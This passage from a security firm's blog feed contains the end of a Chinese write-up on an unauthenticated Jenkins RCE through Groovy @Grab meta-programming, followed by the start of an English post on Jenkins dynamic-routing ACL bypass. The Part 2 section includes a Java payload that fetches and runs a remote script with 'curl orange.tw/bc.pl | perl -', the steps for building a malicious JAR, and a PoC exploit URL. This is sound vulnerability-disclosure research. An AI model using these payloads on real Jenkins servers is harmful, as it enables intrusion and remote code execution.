            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由於 JAR 檔案其實就是一個 ZIP 壓縮格式的子集，Grape 會檢查檔案中是否存在一些指定的入口點，其中一個 &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; 的入口點檢查引起了我們的興趣，持續跟進 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt; 的實作我們發現:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這裡的 &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; 不就代表著可以呼叫到任意類別的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; 中即可呼叫指定類別的&lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 去執行任意代碼! 完整的漏洞利用過程如下:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;影片:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;到此，我們已經可以完整的控制遠端伺服器! 透過 Meta-Programming 在語法樹解析時期去引入惡意的 JAR 檔，再透過 Java 的 Static Initializer 特性去執行任意指令! 雖然 Jenkins 有內建的 Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)，但這個漏洞是在編譯階段而非執行階段，導致 Sandbox 毫無用武之處!&lt;/p&gt;

&lt;p&gt;由於這是對於 Groovy 底層的一種攻擊方式，因此只要是所有可以碰觸到 Groovy 解析的地方皆有可能有漏洞產生! 而這也是這個漏洞好玩的地方，打破了一般開發者認為沒有執行就不會有問題的思維，對攻擊者來說也用了一個沒有電腦科學的理論知識背景不會知道的方法攻擊! 不然你根本不會想到 Meta-Programming! 除了我回報的 &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; 兩個進入點外，在漏洞被修復後，&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; 也很快的找到了另外一個&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;進入點&lt;/a&gt;去觸發這個漏洞!&lt;/p&gt;

&lt;p&gt;除此之外，這個漏洞更可以與我前一篇 &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; 所發現的漏洞串起來，去繞過 Overall/Read 的限制成為一個名符其實不用認證的遠端代碼執行漏洞!(如果你有好好的讀完這兩篇文章，應該對你不是難事XD) 至於有沒有更多的玩法? 就交給大家自由發揮串出自己的攻擊鏈囉!&lt;/p&gt;

&lt;p&gt;感謝大家的閱讀，Hacking Jenkins 系列文就在這裡差不多先告一個段落囉! 未來將會再發表更多有趣的技術研究敬請期待!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In software engineering, the &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; is a best practice for developers to reduce routine works. In the CI/CD, the most well-known tool is Jenkins. Due to its ease of use, awesome Pipeline system and integration of Container, Jenkins is also the most widely used CI/CD application in the world. According to the &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM Ecosystem Report&lt;/a&gt; by Snyk in 2018, Jenkins held about 60% market share on the survey of CI/CD server.&lt;/p&gt;

&lt;p&gt;For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that the whole corporation is compromised from simply a Jenkins server as our entry point!&lt;/p&gt;

&lt;p&gt;This article is mainly about a brief security review on Jenkins in the last year. During this review, we found 5 vulnerabilities including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Among them, the more discussed one is the vulnerability CVE-2018-1999002. This is an arbitrary file read vulnerability through an unusual attack vector! Tencent YunDing security lab has written a &lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;detailed advisory&lt;/a&gt; about that, and also demonstrated how to exploit this vulnerability from arbitrary file reading to RCE on a real Jenkins site which found from &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;However, we are not going to discuss that in this article. Instead, this post is about another vulnerability found while digging into Stapler framework in order to find a way to bypass the least privilege requirement &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; of CVE-2018-1999002! If you merely take a look at the advisory description, you may be curious – Is it reality to gain code execution with just a crafted URL?&lt;/p&gt;

&lt;p&gt;From my own perspective, this vulnerability is just an Access Control List(ACL) bypass, but because this is a problem of the architecture rather than a single program, there are various ways to exploit this bug! In order to pay off the design debt, Jenkins team also takes lots of efforts (patches in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins side&lt;/a&gt; and &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler side&lt;/a&gt;) to fix that. The patch not only introduces a new routing blacklist and whitelist but also extends the original &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; to protect Jenkins’ routing. Now let’s figure out why Jenkins need to make such a huge code modification!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-scope&quot;&gt;Review Scope&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;This is not a complete code review (An overall security review takes lots of time…), so this review just aims at high impact bugs. The review scope includes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Core&lt;/li&gt;
  &lt;li&gt;Stapler Web Framework&lt;/li&gt;
  &lt;li&gt;Suggested Plugins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During the installation, Jenkins asks whether you want to install suggested plugins such as Git, GitHub, SVN and Pipeline. Basically, most people choose yes, or they will get an inconvenient and hard-to-use Jenkins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-levels&quot;&gt;Privilege Levels&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Because the vulnerability is an ACL bypass, we need to introduce the privilege level in Jenkins first! In Jenkins, there are different kinds of ACL roles, Jenkins even has a specialized plugin &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt;(also in the suggested plugin list) to configure the detailed permission per project. From an attacker’s view, we roughly classify the ACL into 3 types:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;

&lt;p&gt;You can fully control Jenkins. Once the attacker gets this permission, he can execute arbitrary Groovy code via &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is the most hacker-friendly scenario, but it’s hard to see this configuration publicly now due to the increase of security awareness and lots of bots scanning all the IPv4.&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;This can be enabled from the &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; and check the radio box:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Under this mode, all contents are visible and readable. Such as agent logs and job/node information. For attackers, the best benefit of this mode is the accessibility of a bunch of private source codes! However, the attacker cannot do anything further or execute Groovy scripts!&lt;/p&gt;

&lt;p&gt;Although this is not the default setting, for DevOps, they may still open this option for automations. According to a little survey on &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;, there are about 12% servers enabled this mode! We will call this mode &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;This is the default mode. Without a valid credential, you can’t see any information! We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; to call this mode in following sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;

&lt;p&gt;To explain this vulnerability, we will start with Jenkins’ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;Dynamic Routing&lt;/a&gt;. In order to provide developers more flexibilities, Jenkins uses a naming convention to resolve the URL and invoke the method dynamically. Jenkins first tokenizes all the URL by &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;, and begins from &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; as the entry point to match the token one by one. If the token matches (1)public class member or (2)public class method correspond to following naming conventions, Jenkins invokes recursively!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, …)&lt;/li&gt;
    &lt;li&gt;doDynamic(…)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like Jenkins provides developers a lot of flexibility. However, too much freedom is not always a good thing. There are two problems based on this naming convention!&lt;/p&gt;

&lt;h3 id=&quot;1-everything-is-the-subclass-of-javalangobject&quot;&gt;1. Everything is the Subclass of &lt;code class=&quot;highlighter-rouge&quot;&gt;java.lang.Object&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;In Java, everything is a subclass of &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt;. Therefore, all objects must exist the method - &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt;, and the name of &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; just matches the naming convention rule &lt;code class=&quot;highlighter-rouge&quot;&gt;#1&lt;/code&gt;! So the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; can be also invoked during Jenkins dynamic routing!&lt;/p&gt;

&lt;h3 id=&quot;2-whitelist-bypass&quot;&gt;2. Whitelist Bypass&lt;/h3&gt;

&lt;p&gt;As mentioned before, the biggest difference between &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; is, if the flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt;, the entry point will do one more check in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt;. The check is a white-list based URL prefix check and here is the list:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
